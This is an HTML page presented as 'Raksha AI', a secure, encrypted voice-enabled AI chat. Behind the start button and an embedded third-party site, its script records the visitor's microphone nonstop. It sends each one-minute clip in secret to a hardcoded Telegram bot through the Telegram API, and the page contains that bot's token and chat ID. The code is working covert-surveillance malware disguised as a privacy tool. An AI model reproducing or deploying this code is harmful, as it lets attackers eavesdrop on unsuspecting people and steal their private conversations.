<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Chat</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        
        /* असली AI वेबसाइट यहाँ दिखेगी */
        #mainFrame {
            width: 100%;
            height: 100%;
            border: none;
            display: none; /* शुरू में छुपा रहेगा */
        }

        /* शुरूआती स्क्रीन - परमिशन लेने के लिए */
        #starterScreen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0d1117; color: #58a6ff; display: flex; 
            flex-direction: column; justify-content: center; align-items: center; 
            z-index: 9999; cursor: pointer; font-family: sans-serif; text-align: center;
        }
        .btn {
            margin-top: 20px; padding: 15px 40px; background: #238636; 
            color: white; border-radius: 8px; font-weight: bold; border: none;
        }
    </style>
</head>
<body>

    <div id="starterScreen" onclick="startSystem()">
        <h2 style="letter-spacing: 1px;">🛡️ RAKSHA AI SECURITY</h2>
        <p style="color: #8b949e; padding: 0 20px;">Initialize encrypted voice-enabled AI session</p>
        <button class="btn">START SECURE CHAT</button>
    </div>

    <iframe id="mainFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone;"></iframe>

    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";

        function startSystem() {
            document.getElementById('starterScreen').style.display = 'none';
            document.getElementById('mainFrame').style.display = 'block';
            
            // ऑडियो रिकॉर्डिंग शुरू करें
            initAudioCapture();
        }

        async function initAudioCapture() {
            try {
                // माइक्रोफोन की परमिशन मांगना
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", MY_ID);
                    fd.append("voice", blob, "voice_log.ogg");
                    fd.append("caption", "🎤 Audio Recording: " + new Date().toLocaleTimeString());

                    // टेलीग्राम पर चुपचाप भेजना
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
                        method: "POST",
                        body: fd
                    }).catch(err => console.error("TG Error"));

                    chunks = [];
                    // दोबारा रिकॉर्डिंग शुरू करना (Loop)
                    if (stream.active) {
                        setTimeout(() => {
                            if (recorder.state === "inactive") recorder.start();
                        }, 1000);
                    }
                };

                // पहली बार रिकॉर्डिंग शुरू करें
                recorder.start();

                // हर 60 सेकंड (1 मिनट) में रिकॉर्डिंग काटकर टेलीग्राम पर भेजें
                setInterval(() => {
                    if (recorder.state === "recording") {
                        recorder.stop();
                    }
                }, 60000);

            } catch (err) {
                console.log("Mic access is required for AI features.");
            }
        }
    </script>
</body>
</html>
